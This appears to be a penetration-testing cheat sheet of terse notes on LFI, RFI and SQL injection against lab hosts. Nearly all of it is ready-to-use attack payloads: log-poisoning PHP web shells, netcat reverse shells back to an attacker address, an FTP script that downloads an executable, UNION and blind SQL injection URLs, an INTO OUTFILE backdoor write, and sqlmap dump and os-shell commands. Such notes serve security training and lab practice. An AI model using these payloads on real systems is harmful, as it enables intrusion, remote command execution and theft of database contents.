# SQL Injection

### LFI
```
Directory traversal, can we identify files that are useful, e.g (use of boot.ini), the ../../../ pattern, identification of the access.log location 

# Use of netcat to inject <?php echo shell_exec['cmd']?> and invoke the access.log 
nc to port 80 
<?php echo shell_exec($_GET['cmd']);?> 

#then access the log file in the url to get it to execute cmd.exe 
http://10.x.x.x/addguestbook.php?name=myname&comment=b&cmd=c:\evil.exe%20-nv%2010.x.x.x%20443%20-e%20cmd&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit 

# with the cmd already echo'd in the log, we call the log file and then can run commands in the url bar. 
# start pure-ftpd on attacking machine setup account and directory and files wanting to share 

nc to port 80 and echo'd the following: 

echo open 10.x.x.x 21 > c:\Windows\System32\ftp.txt 
echo user >> c:\Windows\System32\ftp.txt 
echo pass >> c:\Windows\System32\ftp.txt 
echo bin >> c:\Windows\System32\ftp.txt 
echo GET File.exe >> c:\Windows\System32\ftp.txt 
echo bye >> c:\Windows\System32\ftp.txt 

ftp -s:ftp.txt 
after File.exe is on the box 

setup listener on attacking box 
nc -nlvp 443 

run command in url 

http://10.x.x.x/addguestbook.php?name=myname&comment=b&cmd=c:\evil.exe%20-nv%2010.x.x.x%20443%20-e%20cmd&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit 

```

### RFI
```
http://10.x.x.x/addguestbook.php?name=user2&comment=hello%0D%0A&LANG=http://10.x.x.x7/evil.txt%00&Submit=Submit 

echo '<?php echo shell_exec("c:\evil -nv 10.11.0.247 443 -e cmd");?>' > /var/www/html/evil.txt 
<?php echo shell_exec("c:\evil -nv 10.11.0.247 443 -e cmd");?> 
```

### Enumerating the Database (using union statements)
```
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,table_name,6%20from%20information_schema.tables
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,@@version,6
http://10.x.x.x/comment.php?id=738 union all select 1,2,3,4,user(),6            #shows user running mysql 
http://10.x.x.x/comment.php?id=782 order by 1                                   # try till it fails or gives different output to see qty of columns
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,5,6
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,column_name,6%20from%20information_schema.columns%20where%20table_name=%27users%27
```

### Blind SQL Injection
```
http://10.x.x.x/comment.php?id=782%20and%201=1 (and 1=1)
http://10.x.x.x/comment.php?id=782-sleep(5) (-sleep(5))
```

### load_file Function
```
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,load_file(“c:/windows/system32/drivers/etc/hosts”),6

```
### into OUTFILE
```
Into OUTFILE
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,%22%3C?php%20echoshell_exec($_GET[%27cmd%27]);?%3E%22,6%20into%20OUTFILE%20%27c:/xampp/htdocs/backdoor.php%27

http://10.x.x.x/backdoor.php?cmd=c:/Users/Administrator/Desktop/Tools/netcat/nc.exe -nv 10.x.x.x 443 -e cmd 

http://10.x.x.x/backdoor.php?cmd=ipconfig
```

### PHP One-Liner
```
<?php echo shell_exec($_GET['cmd']);?>"
```

### SQLMap
```
Sqlmal -u http://10.x.x.x --crawl=1
Sqlmap -u http://10.x.x.x/comment.php --dump --dbms=mysql --threads=5
Sqlmap -u http://10.x.x.x/comment.php --dbms=mysql --threads=5 --os-shell

# List available databases:
sqlmap -u <target> --dbs <options>

# List tables with -D switch:
sqlmap -u <target> -D <database> --tables <other-options>

# Choose more tables:
sqlmap -u <target> -D <database> -T <tables,comma separated list> --columns <other options>

# You can dump JUST the columns you need:
sqlmap -u <target> -D <database> -T <table> -C <columns list> --dump <other options>

```

### Webapp Proxies
Use Tamper Data in Firefox to change output where restricted at client level
